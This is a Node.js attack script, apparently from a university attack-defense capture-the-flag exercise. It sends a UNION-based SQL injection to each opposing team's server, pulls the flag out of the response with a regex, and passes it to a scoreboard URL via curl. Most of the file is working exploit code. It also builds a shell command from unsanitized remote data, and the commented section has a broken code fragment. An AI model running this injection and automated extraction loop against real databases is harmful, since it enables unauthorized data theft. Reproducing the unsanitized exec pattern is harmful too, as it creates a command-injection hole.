var http = require('http');
var colors = require('colors');
var exec = require('child_process').exec;

var inject = function (team) {
    return "http://10.8." + team.toString() + ".100:7788/menu.php/db/name/1'+UNION+SELECT+*+FROM+flag+UNION+SELECT+*+FROM+pm_list+WHERE+id='2";
}

var submit = function (flag) {
    var command = "curl –L http://people.cs.nctu.edu.tw/~hwcheng/NSFinal/flag.php?ID=13&flag=" + flag.toString();
    child = exec(command);
}

var regex = /\>(\d) (\w*)\<\/div\>/;

var attack = function (team) {
    console.log('ATTACKING: '.green + inject(team));
    var req = http.request(inject(team), function (res) {
        console.log('STATUS: '.green + res.statusCode);
        //console.log('HEADERS: '.green + JSON.stringify(res.headers));
        //res.setEncoding('utf8');
        res.on('data', function (chunk) {
            match = chunk.toString().match(regex);
            if (match) {
                var flag = match[2];
                console.log('FLAG: '.green, flag);
                submit(flag);
            }
        });

    });

    req.on('error', function(e) {
      console.log('problem with request: ' + e.message);
    });
    req.end();
}




// child_process.spawn("touch ha")
// i = 0;
// var tick = true;
// while (true) {
//     if (Math.floor(Date.now()/30000) % 2 === 0) {
//         if (tick) {
//             console.log('ha');
//             tick = false;
//         }
//     } else if (Math.floor(Date.now()/30000) % 2 === 1) {
//         tick = true;
//     } if
// }Use curl to submit flag
// curl –L http://people.cs.nctu.edu.tw/~hwcheng/NSFinal/flag.php?ID=[TeamID]&flag=[flag]
// for (var i = 0; i < 36; i++) {
//     sleep.sleep(60);
//     attack(i);
// }
